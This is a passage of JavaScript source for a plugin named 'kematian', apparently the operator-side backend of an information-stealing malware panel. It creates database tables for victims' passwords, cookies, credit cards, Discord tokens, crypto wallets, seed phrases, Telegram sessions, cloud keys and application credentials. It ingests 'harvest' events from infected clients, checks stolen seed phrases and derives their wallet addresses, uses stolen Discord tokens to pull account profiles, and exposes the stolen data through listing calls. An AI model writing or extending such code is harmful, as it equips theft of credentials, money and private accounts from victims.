        url TEXT, title TEXT, visit_time_unix INTEGER,
        browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS hi_client ON history(client_id);
      CREATE INDEX IF NOT EXISTS hi_visit  ON history(visit_time_unix);
      CREATE UNIQUE INDEX IF NOT EXISTS hi_dedup ON history(client_id, url, visit_time_unix, browser, profile);

      CREATE TABLE IF NOT EXISTS bookmarks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, url TEXT, type TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS bk_client ON bookmarks(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS bk_dedup ON bookmarks(client_id, url, browser, profile);

      CREATE TABLE IF NOT EXISTS credit_cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name_on_card TEXT, card_number TEXT, expiration_month TEXT, expiration_year TEXT,
        nickname TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS cc_client ON credit_cards(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS cc_dedup ON credit_cards(client_id, card_number, name_on_card, browser, profile);

      CREATE TABLE IF NOT EXISTS discord_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        token TEXT, source TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS dt_client ON discord_tokens(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS dt_dedup ON discord_tokens(client_id, token);

      CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        dir TEXT, name TEXT, ext TEXT, size INTEGER, modified INTEGER, path TEXT,
        tags TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS fi_client ON files(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS fi_dedup ON files(client_id, path);

      CREATE TABLE IF NOT EXISTS extensions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        ext_id TEXT, name TEXT, version TEXT, browser TEXT, profile TEXT, path TEXT,
        category TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ex_client ON extensions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ex_dedup ON extensions(client_id, ext_id, browser, profile);

      CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, type TEXT, path TEXT, files INTEGER, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wl_client ON wallets(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wl_dedup ON wallets(client_id, name, path);

      CREATE TABLE IF NOT EXISTS discord_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        token TEXT NOT NULL UNIQUE,
        user_id TEXT, username TEXT, discriminator TEXT, global_name TEXT,
        avatar TEXT, email TEXT, phone TEXT,
        verified INTEGER, mfa_enabled INTEGER, premium_type INTEGER,
        flags INTEGER, public_flags INTEGER, locale TEXT,
        friends_count INTEGER, guilds_count INTEGER, guild_names TEXT,
        enriched_at INTEGER, error TEXT
      );
      CREATE INDEX IF NOT EXISTS dp_client ON discord_profiles(client_id);

      CREATE TABLE IF NOT EXISTS wallet_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT NOT NULL,
        path TEXT NOT NULL,
        type TEXT,
        addresses TEXT,
        vault_data TEXT,
        content BLOB,
        size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wld_client ON wallet_data(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wld_client_name ON wallet_data(client_id, name);

      CREATE TABLE IF NOT EXISTS telegram_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        account TEXT NOT NULL,
        path TEXT,
        files INTEGER,
        size INTEGER,
        content BLOB,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS tg_client ON telegram_sessions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS tg_client_account ON telegram_sessions(client_id, account);

      CREATE TABLE IF NOT EXISTS cloud_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        type TEXT NOT NULL,
        name TEXT NOT NULL,
        path TEXT,
        size INTEGER,
        content TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck2_client ON cloud_keys(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ck2_dedup ON cloud_keys(client_id, type, name, path);

      CREATE TABLE IF NOT EXISTS seeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        source TEXT NOT NULL,
        path TEXT,
        phrase TEXT NOT NULL,
        words INTEGER NOT NULL,
        valid INTEGER DEFAULT 0,
        addresses TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS sd_client ON seeds(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS sd_phrase ON seeds(client_id, phrase);

      CREATE TABLE IF NOT EXISTS app_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        application TEXT NOT NULL,
        host TEXT,
        port INTEGER,
        username TEXT,
        password TEXT,
        protocol TEXT,
        extra TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ac_client ON app_credentials(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ac_dedup ON app_credentials(client_id, application, host, username, protocol);

      CREATE TABLE IF NOT EXISTS client_runs (
        client_id TEXT PRIMARY KEY,
        last_captured_at INTEGER NOT NULL
      );

      CREATE TABLE IF NOT EXISTS collect_errors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        error TEXT NOT NULL,
        created_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ce_client ON collect_errors(client_id);
    `);
    // Migrations for installs predating these fields
    try { ctx.db.exec(`ALTER TABLE files ADD COLUMN tags TEXT`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS discord_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, token TEXT NOT NULL UNIQUE,
        user_id TEXT, username TEXT, discriminator TEXT, global_name TEXT,
        avatar TEXT, email TEXT, phone TEXT,
        verified INTEGER, mfa_enabled INTEGER, premium_type INTEGER,
        flags INTEGER, public_flags INTEGER, locale TEXT,
        friends_count INTEGER, guilds_count INTEGER, guild_names TEXT,
        enriched_at INTEGER, error TEXT
      );
      CREATE INDEX IF NOT EXISTS dp_client ON discord_profiles(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS extensions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        ext_id TEXT, name TEXT, version TEXT, browser TEXT, profile TEXT, path TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ex_client ON extensions(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE extensions ADD COLUMN category TEXT`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS pw_dedup ON passwords(client_id, url, username, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ck_dedup ON cookies(client_id, host, name, path, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS af_dedup ON autofill(client_id, name, value, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS hi_dedup ON history(client_id, url, visit_time_unix, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS bk_dedup ON bookmarks(client_id, url, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS cc_dedup ON credit_cards(client_id, card_number, name_on_card, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS dt_dedup ON discord_tokens(client_id, token)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS fi_dedup ON files(client_id, path)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ex_dedup ON extensions(client_id, ext_id, browser, profile)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS wl_dedup ON wallets(client_id, name, path)`); } catch (_) {}
    try { ctx.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS ck2_dedup ON cloud_keys(client_id, type, name, path)`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, path TEXT, files INTEGER, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wl_client ON wallets(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE wallets ADD COLUMN type TEXT`); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS wallet_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, name TEXT NOT NULL, path TEXT NOT NULL,
        type TEXT, addresses TEXT, vault_data TEXT, content BLOB, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wld_client ON wallet_data(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wld_client_name ON wallet_data(client_id, name);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS telegram_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, account TEXT NOT NULL, path TEXT,
        files INTEGER, size INTEGER, content BLOB, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS tg_client ON telegram_sessions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS tg_client_account ON telegram_sessions(client_id, account);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS cloud_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, type TEXT NOT NULL, name TEXT NOT NULL,
        path TEXT, size INTEGER, content TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck2_client ON cloud_keys(client_id);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS seeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, source TEXT NOT NULL, path TEXT,
        phrase TEXT NOT NULL, words INTEGER NOT NULL,
        valid INTEGER DEFAULT 0, addresses TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS sd_client ON seeds(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS sd_phrase ON seeds(client_id, phrase);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS app_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, application TEXT NOT NULL,
        host TEXT, port INTEGER, username TEXT, password TEXT,
        protocol TEXT, extra TEXT, captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ac_client ON app_credentials(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ac_dedup ON app_credentials(client_id, application, host, username, protocol);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS gaming_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, platform TEXT NOT NULL,
        label TEXT NOT NULL, value TEXT, detail TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS gi_client ON gaming_items(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS gi_dedup ON gaming_items(client_id, platform, label, value);
    `); } catch (_) {}
    try { ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS vpn_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL, provider TEXT NOT NULL,
        label TEXT NOT NULL, value TEXT, detail TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS vi_client ON vpn_items(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS vi_dedup ON vpn_items(client_id, provider, label, value);
    `); } catch (_) {}
    // Settings table
    ctx.db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)`);

    // blob_path columns for disk-backed BLOBs
    try { ctx.db.exec(`ALTER TABLE wallet_data ADD COLUMN blob_path TEXT`); } catch (_) {}
    try { ctx.db.exec(`ALTER TABLE telegram_sessions ADD COLUMN blob_path TEXT`); } catch (_) {}

    // Create blob directory
    blobDir = join(ctx.dataDir, "blobs");
    try { mkdirSync(blobDir, { recursive: true }); } catch (_) {}

    // One-time migration: move BLOBs from DB to disk + enable auto-vacuum
    const migDone = ctx.db.prepare(`SELECT value FROM settings WHERE key = 'blob_migration_done'`).get();
    if (!migDone) {
      let migrated = 0;
      const wdRows = ctx.db.prepare(`SELECT id, client_id, name, content FROM wallet_data WHERE content IS NOT NULL AND blob_path IS NULL`).all();
      for (const r of wdRows) {
        const bp = walletBlobPath(r.client_id, r.name);
        if (writeBlob(bp, Buffer.from(r.content))) {
          ctx.db.prepare(`UPDATE wallet_data SET blob_path = ?, content = NULL WHERE id = ?`).run(bp, r.id);
          migrated++;
        }
      }
      const tgRows = ctx.db.prepare(`SELECT id, client_id, account, content FROM telegram_sessions WHERE content IS NOT NULL AND blob_path IS NULL`).all();
      for (const r of tgRows) {
        const bp = telegramBlobPath(r.client_id, r.account);
        if (writeBlob(bp, Buffer.from(r.content))) {
          ctx.db.prepare(`UPDATE telegram_sessions SET blob_path = ?, content = NULL WHERE id = ?`).run(bp, r.id);
          migrated++;
        }
      }
      if (migrated > 0) console.log(`[kematian] migrated ${migrated} BLOBs to disk`);
      try {
        ctx.db.exec(`PRAGMA auto_vacuum=INCREMENTAL`);
        ctx.db.exec(`VACUUM`);
        console.log("[kematian] VACUUM complete — auto_vacuum=INCREMENTAL enabled");
      } catch (e) { console.error("[kematian] VACUUM failed:", e.message); }
      ctx.db.prepare(`INSERT OR REPLACE INTO settings(key,value) VALUES('blob_migration_done','1')`).run();
    }

    // Reclaim freed pages from recent deletes
    try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}

    // Load settings and run purge
    loadSettings(ctx.db);
    try {
      const nowChrome = (Date.now() + 11644473600000) * 1000;
      const expired = ctx.db.prepare(`DELETE FROM cookies WHERE expires_utc > 0 AND expires_utc < ?`).run(nowChrome);
      if (expired.changes > 0) console.log(`[kematian] purged ${expired.changes} expired cookies`);
      const purged = runPurge(ctx.db);
      if (purged > 0) console.log(`[kematian] purged ${purged} rows (history/cookie limits)`);
    } catch (_) {}

    try {
      stmts = prepareStatements(ctx.db);
    } catch (err) {
      console.error("[kematian] prepareStatements failed:", err.message, err.stack || "");
      throw err;
    }
  },

  onEvent(ctx, clientId, event, payload) {
    if (!stmts) { console.error("[kematian] onEvent called but stmts is null — setup likely failed"); return; }
    const now = Date.now();

    if (event === "results") {
      const tx = ctx.db.transaction(() => {
        insertPayload(ctx.db, stmts, clientId, payload, now);
        storeErrors(ctx.db, stmts, clientId, payload.errors, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      for (const r of payload.discordTokens || [])
        enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "partial") {
      const tx = ctx.db.transaction(() => {
        insertPayload(ctx.db, stmts, clientId, payload, now);
        storeErrors(ctx.db, stmts, clientId, payload.errors, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      for (const r of payload.discordTokens || [])
        if (needsEnrichment(ctx, r.token))
          enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "error") {
      if (payload?.error) {
        ctx.db.prepare(`INSERT INTO collect_errors(client_id,error,created_at) VALUES(?,?,?)`)
          .run(clientId, String(payload.error), now);
        ctx.broadcast("harvest_update", { clientId });
      }
    } else if (event === "file_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.files || [])
          stmts.insFi.run(clientId, r.dir, r.name, r.ext, r.size, r.modified, r.path, (r.tags || []).join(",") || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "extension_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.extensions || [])
          stmts.insEx.run(clientId, r.extId, r.name, r.version, r.browser, r.profile, r.path, r.category || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "wallet_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.wallets || [])
          stmts.insWl.run(clientId, r.name, r.type || null, r.path, r.files, r.size, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "wallet_auto_data") {
      const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
      let bp = null;
      if (content && blobDir) {
        bp = walletBlobPath(clientId, payload.name);
        if (!writeBlob(bp, content)) bp = null;
      }
      ctx.db.prepare(`INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`)
        .run(clientId, payload.name, payload.path, payload.type || null,
             JSON.stringify(payload.addresses || []), payload.vaultData || null,
             bp ? null : content, bp, payload.size || 0, now);
      ctx.broadcast("wallet_data_update", { clientId, name: payload.name });
    } else if (event === "telegram_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.sessions || [])
          stmts.insTg.run(clientId, r.account, r.path, r.files, r.size, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "telegram_data") {
      const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
      let bp = null;
      if (content && blobDir) {
        bp = telegramBlobPath(clientId, payload.account);
        if (!writeBlob(bp, content)) bp = null;
      }
      ctx.db.prepare(`INSERT OR REPLACE INTO telegram_sessions(client_id,account,path,files,size,content,blob_path,captured_at) VALUES(?,?,?,?,?,?,?,?)`)
        .run(clientId, payload.account, payload.path, 0, payload.size || 0, bp ? null : content, bp, now);
      ctx.broadcast("telegram_data_update", { clientId, account: payload.account });
    } else if (event === "app_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.appCredentials || [])
          stmts.insApp.run(clientId, r.application, r.host || null, r.port || 0, r.username || null, r.password || null, r.protocol || null, r.extra || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "gaming_scan_results") {
      if (payload?.gaming) {
        const tx = ctx.db.transaction(() => {
          insertPayload(ctx.db, stmts, clientId, { gaming: payload.gaming }, now);
          stmts.upsertRun.run(clientId, now);
        });
        tx();
        ctx.broadcast("harvest_update", { clientId });
      }
    } else if (event === "vpn_scan_results") {
      if (payload?.vpns) {
        const tx = ctx.db.transaction(() => {
          insertPayload(ctx.db, stmts, clientId, { vpns: payload.vpns }, now);
          stmts.upsertRun.run(clientId, now);
        });
        tx();
        ctx.broadcast("harvest_update", { clientId });
      }
    } else if (event === "key_scan_results") {
      const tx = ctx.db.transaction(() => {
        for (const r of payload?.keys || [])
          stmts.insKey.run(clientId, r.type, r.name, r.path, r.size, r.content || null, now);
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("harvest_update", { clientId });
    } else if (event === "seed_scan_results") {
      const seeds = payload?.seeds || [];
      if (!seeds.length) return;
      const tx = ctx.db.transaction(() => {
        for (const s of seeds) {
          const words = s.phrase.split(/\s+/);
          let valid = 0;
          let addresses = null;
          try {
            if (words.every(w => wordlist.includes(w))) {
              valid = 1;
              const addrs = [
                ...deriveEthAddresses(s.phrase, 2).map(a => ({ chain: "EVM", address: a })),
                ...deriveBtcAddresses(s.phrase, 1).map(a => ({ chain: "BTC", address: a })),
                ...deriveLtcAddresses(s.phrase, 1).map(a => ({ chain: "LTC", address: a })),
                ...deriveTrxAddresses(s.phrase, 1).map(a => ({ chain: "TRX", address: a })),
              ];
              addresses = JSON.stringify(addrs);
            }
          } catch (_) {}
          stmts.insSeed.run(clientId, s.source, s.path || null, s.phrase, s.words, valid, addresses, now);
        }
        stmts.upsertRun.run(clientId, now);
      });
      tx();
      ctx.broadcast("seed_update", { clientId, count: seeds.length });
    }
  },

  rpc: {
    get_stats(ctx) {
      return ctx.db.prepare(`
        WITH
          pw AS (SELECT client_id, COUNT(*) AS c FROM passwords GROUP BY client_id),
          ck AS (SELECT client_id, COUNT(*) AS c FROM cookies GROUP BY client_id),
          af AS (SELECT client_id, COUNT(*) AS c FROM autofill GROUP BY client_id),
          hi AS (SELECT client_id, COUNT(*) AS c FROM history GROUP BY client_id),
          bk AS (SELECT client_id, COUNT(*) AS c FROM bookmarks GROUP BY client_id),
          cc AS (SELECT client_id, COUNT(*) AS c FROM credit_cards GROUP BY client_id),
          dt AS (SELECT client_id, COUNT(*) AS c FROM discord_tokens GROUP BY client_id),
          fi AS (SELECT client_id, COUNT(*) AS c FROM files GROUP BY client_id),
          ex AS (SELECT client_id, COUNT(*) AS c FROM extensions GROUP BY client_id),
          wl AS (SELECT client_id, COUNT(*) AS c FROM wallets GROUP BY client_id),
          tg AS (SELECT client_id, COUNT(*) AS c FROM telegram_sessions GROUP BY client_id),
          ky AS (SELECT client_id, COUNT(*) AS c FROM cloud_keys GROUP BY client_id),
          sd AS (SELECT client_id, COUNT(*) AS c FROM seeds GROUP BY client_id),
          ac AS (SELECT client_id, COUNT(*) AS c FROM app_credentials GROUP BY client_id),
          gi AS (SELECT client_id, COUNT(*) AS c FROM gaming_items GROUP BY client_id),
          vi AS (SELECT client_id, COUNT(*) AS c FROM vpn_items GROUP BY client_id)
        SELECT
          cr.client_id AS clientId,
          cr.last_captured_at AS lastCapturedAt,
          COALESCE(pw.c,0) AS passwords,
          COALESCE(ck.c,0) AS cookies,
          COALESCE(af.c,0) AS autofill,
          COALESCE(hi.c,0) AS history,
          COALESCE(bk.c,0) AS bookmarks,
          COALESCE(cc.c,0) AS creditCards,
          COALESCE(dt.c,0) AS discordTokens,
          COALESCE(fi.c,0) AS files,
          COALESCE(ex.c,0) AS extensions,
          COALESCE(wl.c,0) AS wallets,
          COALESCE(tg.c,0) AS telegram,
          COALESCE(ky.c,0) AS keys,
          COALESCE(sd.c,0) AS seeds,
          COALESCE(ac.c,0) AS appCredentials,
          COALESCE(gi.c,0) AS gamingItems,
          COALESCE(vi.c,0) AS vpnItems
        FROM client_runs cr
        LEFT JOIN pw ON pw.client_id = cr.client_id
        LEFT JOIN ck ON ck.client_id = cr.client_id
        LEFT JOIN af ON af.client_id = cr.client_id
        LEFT JOIN hi ON hi.client_id = cr.client_id
        LEFT JOIN bk ON bk.client_id = cr.client_id
        LEFT JOIN cc ON cc.client_id = cr.client_id
        LEFT JOIN dt ON dt.client_id = cr.client_id
        LEFT JOIN fi ON fi.client_id = cr.client_id
        LEFT JOIN ex ON ex.client_id = cr.client_id
        LEFT JOIN wl ON wl.client_id = cr.client_id
        LEFT JOIN tg ON tg.client_id = cr.client_id
        LEFT JOIN ky ON ky.client_id = cr.client_id
        LEFT JOIN sd ON sd.client_id = cr.client_id
        LEFT JOIN ac ON ac.client_id = cr.client_id
        LEFT JOIN gi ON gi.client_id = cr.client_id
        LEFT JOIN vi ON vi.client_id = cr.client_id
        ORDER BY cr.last_captured_at DESC
      `).all();
    },

    async get_summary(ctx) {
      const clients = ctx.db.prepare(`
        WITH
          pw AS (SELECT client_id, COUNT(*) AS c FROM passwords GROUP BY client_id),
          ck AS (SELECT client_id, COUNT(*) AS c FROM cookies GROUP BY client_id),
          cc AS (SELECT client_id, COUNT(*) AS c FROM credit_cards GROUP BY client_id),
          dt AS (SELECT client_id, COUNT(*) AS c FROM discord_tokens GROUP BY client_id),
          wl AS (SELECT client_id, COUNT(*) AS c FROM wallets GROUP BY client_id)
        SELECT
          cr.client_id AS clientId,
          cr.last_captured_at AS lastCapturedAt,
          COALESCE(pw.c,0) AS passwords,
          COALESCE(ck.c,0) AS cookies,
          COALESCE(cc.c,0) AS creditCards,
          COALESCE(dt.c,0) AS discordTokens,
          COALESCE(wl.c,0) AS wallets
        FROM client_runs cr
        LEFT JOIN pw ON pw.client_id = cr.client_id
        LEFT JOIN ck ON ck.client_id = cr.client_id
        LEFT JOIN cc ON cc.client_id = cr.client_id
        LEFT JOIN dt ON dt.client_id = cr.client_id
        LEFT JOIN wl ON wl.client_id = cr.client_id
        ORDER BY cr.last_captured_at DESC
      `).all();

      const allWallets = ctx.db.prepare(`SELECT client_id, name, type FROM wallets`).all();
      const allWalletData = ctx.db.prepare(`SELECT client_id, name, content IS NOT NULL AS hasContent, vault_data IS NOT NULL AS hasVault FROM wallet_data`).all();
      const allPwCounts = ctx.db.prepare(`SELECT client_id, COUNT(*) AS cnt FROM passwords WHERE password IS NOT NULL AND password != '' GROUP BY client_id`).all();

      const walletsByClient = {};
      for (const w of allWallets) {
        (walletsByClient[w.client_id] ??= []).push(w);
      }
      const walletDataByClient = {};
      for (const w of allWalletData) {
        (walletDataByClient[w.client_id] ??= []).push(w);
      }
      const pwCountMap = {};
      for (const p of allPwCounts) pwCountMap[p.client_id] = p.cnt;

      return clients.map(c => {
        const walletRows = walletsByClient[c.clientId] || [];
        const walletDataRows = walletDataByClient[c.clientId] || [];
        const downloaded = walletDataRows.filter(w => w.hasContent);
        return {
          ...c,
          walletNames: walletRows.map(w => w.name),
          walletDownloaded: downloaded.map(w => w.name),
          walletVaults: downloaded.filter(w => w.hasVault).map(w => w.name),
          passwordCount: pwCountMap[c.clientId] || 0,
        };
      });
    },

    list_passwords(ctx, params)      { return listTable(ctx, TABLE_CFGS.passwords,      params); },
    list_cookies(ctx, params)        { return listTable(ctx, TABLE_CFGS.cookies,        params); },
    list_autofill(ctx, params)       { return listTable(ctx, TABLE_CFGS.autofill,       params); },
    list_history(ctx, params)        { return listTable(ctx, TABLE_CFGS.history,        params); },
    list_bookmarks(ctx, params)      { return listTable(ctx, TABLE_CFGS.bookmarks,      params); },
    list_credit_cards(ctx, params)   { return listTable(ctx, TABLE_CFGS.credit_cards,   params); },
    list_discord_tokens(ctx, params) { return listTable(ctx, TABLE_CFGS.discord_tokens, params); },

    list_discord_profiles(ctx, params) {
      const cid    = params?.clientId;
      const search = String(params?.search || '').trim();
      const wheres = [], args = [];
      if (cid)    { wheres.push('dt.client_id = ?'); args.push(cid); }
      if (search) {
        wheres.push('(dt.token LIKE ? OR dp.username LIKE ? OR dp.email LIKE ? OR dp.global_name LIKE ?)');
        args.push(`%${search}%`, `%${search}%`, `%${search}%`, `%${search}%`);
      }
      const where = wheres.length ? ' WHERE ' + wheres.join(' AND ') : '';
      const rows = ctx.db.prepare(`
        SELECT dt.client_id as clientId, dt.token, dt.source, dt.captured_at,
               dp.user_id, dp.username, dp.discriminator, dp.global_name, dp.avatar,
               dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
               dp.flags, dp.public_flags, dp.locale, dp.friends_count, dp.guilds_count,
               dp.guild_names, dp.enriched_at, dp.error
        FROM discord_tokens dt
        LEFT JOIN discord_profiles dp ON dp.token = dt.token
        ${where}
        ORDER BY dt.captured_at DESC
      `).all(...args);
      return { rows, total: rows.length };
    },

    async enrich_discord_token(ctx, params) {
      const { token, clientId } = params || {};
      if (!token)    throw new Error('token required');
      if (!clientId) throw new Error('clientId required');
      await enrichDiscordToken(ctx, clientId, token);
      const profile = ctx.db.prepare(`SELECT * FROM discord_profiles WHERE token = ?`).get(token);
      return { ok: true, profile };
    },

    async enrich_all_discord(ctx, params) {
      const cid   = params?.clientId;
      const where = cid ? 'WHERE client_id = ?' : '';
      const args  = cid ? [cid] : [];
      const tokens = ctx.db.prepare(`SELECT client_id, token FROM discord_tokens ${where} ORDER BY captured_at DESC`).all(...args);
      await Promise.all(tokens.map(t => enrichDiscordToken(ctx, t.client_id, t.token).catch(() => {})));
      ctx.broadcast("harvest_update", { clientId: cid || null });
      return { ok: true, enriched: tokens.length };
    },
    list_files(ctx, params)          { return listTable(ctx, TABLE_CFGS.files,          params); },
    list_extensions(ctx, params)     { return listTable(ctx, TABLE_CFGS.extensions,     params); },
    list_wallets(ctx, params)        { return listTable(ctx, TABLE_CFGS.wallets,        params); },
    list_telegram(ctx, params)       { return listTable(ctx, TABLE_CFGS.telegram,       params); },
    list_keys(ctx, params)           { return listTable(ctx, TABLE_CFGS.keys,           params); },
    list_seeds(ctx, params)              { return listTable(ctx, TABLE_CFGS.seeds,              params); },

    get_wallet_seeds(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
